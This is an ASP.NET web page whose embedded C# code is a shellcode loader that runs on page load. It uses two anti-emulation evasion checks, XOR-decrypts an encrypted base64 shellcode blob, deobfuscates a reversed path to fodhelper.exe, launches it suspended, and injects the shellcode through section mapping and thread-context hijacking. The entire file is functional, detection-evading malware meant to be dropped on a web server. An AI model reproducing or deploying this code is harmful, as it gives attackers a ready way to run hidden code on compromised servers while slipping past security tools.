<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
        public const uint CREATE_SUSPENDED = 0x4;

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }


        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }




        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        public struct THREADENTRY32
        {
            internal UInt32 dwSize;
            internal UInt32 cntUsage;
            internal UInt32 th32ThreadID;
            internal UInt32 th32OwnerProcessID;
            internal UInt32 tpBasePri;
            internal UInt32 tpDeltaPri;
            internal UInt32 dwFlags;
        }


        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }




        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }


        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }




        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();


        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);


        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [System.Runtime.InteropServices.In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION
            lpProcessInformation);


        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        static extern int SuspendThread(IntPtr hThread);


        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
           ref IntPtr section,
           UInt32 desiredAccess,
           IntPtr pAttrs,
           ref long MaxSize,
           uint pageProt,
           uint allocationAttribs,
           IntPtr hFile);

        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);


        [System.Runtime.InteropServices.DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        [System.Runtime.InteropServices.DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);







    protected void Page_Load(object sender, EventArgs e) {

        string obfuscatedstringname = "exe.replehdof\\23metsyS\\swodniW\\:C";
        //string obfuscatedstringname = "exe.tsohcvs\\23metsyS\\swodniW\\:C";
        string stringname = "";

        /* EVASION 1: VirtualAllocExNuma to evade emulation */
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null) {
                return; //Emulation detected
        }

        /* EVASION 2: Sleep to evade emulation */
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        string key = "dummy"; // dummy key
        if (t2 < 2) {
                key = "NowayNoway!"; // wrong key
        } else {
                key = "Sup3rS3cr3t!"; //right key
        }
        if (key == "NowayNoway!") {
                return; //Emulation detected
        }
        else {
                //Encrypted and b64 encoded. See "Sh3llcode encrpyter1.exe"
                string base64Encoded = "rz3z14K7/2NyMzUCNCBhOmLhMiRWPNgnEHv5ASsr+WFUG3rHeTgbuBEifkWaPUHz3m9SH3AfVBK0uT4zUvKBn2E82CdQciPYcV86MqQ19AgreVE85gAzdFP+8LtyUzMr9/MAND1x4/kbKyf5c1QDPHHjkQV7nLty/2f9ODKkHgKqOgK0ErS5Pt4SMqJK0wGiOXN/Vlt2WqNGrAsx+3NWGjKzFHL/Xz00uDJPemKicv9X/TFrMwt7YqJtLQk0KHIrEmkr8d9UEieP0yoSajk6uGa6Po/MjQ57UqlgPe0CGV0bPVYXcnIiG/yRerWRfxRUNIuGJiN7+7JgOT8CtB5EuWAhGolZJErTU3VwM42G22xyM3RiTEIdQ2ULTUYKWmJCSTMoG7qiO/S06HRwMz9i+jAhWXcAPMpk+8z1Y3IzdKygmFxyUzNMEXwOFgUYUR01ZTZGVSA/KidEJhIHIh8EOGA2XX0+IERTN1JNIkEnYzchWSY1cUEMEUlkCipdGgcDDhsDA1RfEXUQOQceKR0HfEoSQDdCUR4KJF1aOBpCMTVpJwtHIkNBIncWQ3RZFxAeWl8MfGM6urUALzFrP2L6MDqLdGHd9DNyUzMzIWA9lLebZlxozLY6urI5fy97+6JZfChhHNNGcDM72tMJdnItGs8FdezVM2NyM4uGOEHzIQl76oN+RZo4QfohAHqksB5ySw6P5veTRnw69LXbZnAzO+l3k0fTdFN1cMynG8ysBjGf+Z0lM3JTYDoYcy4a/KHykEN6pLIzZFN1OYkq92CGcjN0U4qle+EAYCv71DzahDi6qBr0o3ITdFM8+co76SH1+9F0U3VwzKcbsKdStrQnxxa4dRsyoPfzAYEts2sYU2rYki5eWTT56Y2G";
                byte[] churro = System.Convert.FromBase64String(base64Encoded);
                for (int i = 0; i < churro.Length; i++) {
                        churro[i] = (byte)(((uint)churro[i] ^ key[i % key.Length]) & 0xFF);
                }

                //Deobfusate host process name
                for (int i = 0; i < obfuscatedstringname.Length; i++)
                {
                    stringname = stringname + obfuscatedstringname[obfuscatedstringname.Length - i-1];
                }


                // Create the section handle.
                IntPtr ptr_section_handle = IntPtr.Zero;
                long buffer_size = churro.Length;
                UInt32 SECTION_MAP_WRITE = 0x0002;
                UInt32 SECTION_MAP_READ = 0x0004;
                UInt32 SECTION_MAP_EXECUTE = 0x0008;
                UInt32 SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
                uint PAGE_EXECUTE_READWRITE = 0x40;
                uint SEC_COMMIT = 0x08000000;
                UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, SECTION_ALL_ACCESS, IntPtr.Zero, ref buffer_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
                if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while creating the section.");
                    return;
                }
                Console.WriteLine("[+] Local section created successfully.");
                Console.WriteLine("[*] Local section handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));


                // Map a view of a section into the virtual address space of the current process.
                long local_section_offset = 0;
                uint PAGE_READWRITE = 0x4;
                IntPtr ptr_local_section_addr = IntPtr.Zero;
                UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_READWRITE);
                if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while mapping the view within the local section.");
                    return;
                }
                Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
                Console.WriteLine("[*] Local section address: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));

                // Copy the shellcode into the mapped section.
                System.Runtime.InteropServices.Marshal.Copy(churro, 0, ptr_local_section_addr, churro.Length);


                //Run host process
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                bool res = CreateProcess(null, stringname, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
                if (res == false)
                {
                    Console.WriteLine("[-] Host process creation failed");
                    return;
                }
                Console.WriteLine("[*] Host process ID: " + pi.dwProcessId);
                Console.WriteLine("[*] Host Thread ID: " + pi.dwThreadId);


                IntPtr ptr_remote_section_addr = IntPtr.Zero;
                uint PAGE_EXECUTE_READ = 0x20;
                UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, pi.hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_EXECUTE_READ);
                if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
                    return;
                }
                Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
                Console.WriteLine("[*] Remote section address: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));



                // Get RIP (only works on 64 bits applications
                CONTEXT64 context = new CONTEXT64();
                context.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
                if (GetThreadContext(pi.hThread, ref context))
                {
                    Console.WriteLine("[*] Original thread Instruction Pointer address (RIP): 0x" + String.Format("{0:X}", (ulong)context.Rip));

                }
                else
                {
                    Console.WriteLine("[-] GetThreadContext failed");
                    return;
                }



                // Unmap the view of the section from the current process & close the handle.
                NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
                NtClose(ptr_section_handle);


                // Set RIP to our shellcode
                context.Rip = (ulong)ptr_remote_section_addr;

                if (SetThreadContext(pi.hThread, ref context))
                {
                    Console.WriteLine("[*] Modified thread Instruction Pointer address (RIP): 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));
                }
                else
                {
                    Console.WriteLine("[-] SetThreadContext failed");
                    return;
                }

                // Resume thread
                Console.WriteLine("[+] Resuming Thread to execute the shellcode...");
                ResumeThread(pi.hThread);


        }
    }
</script>
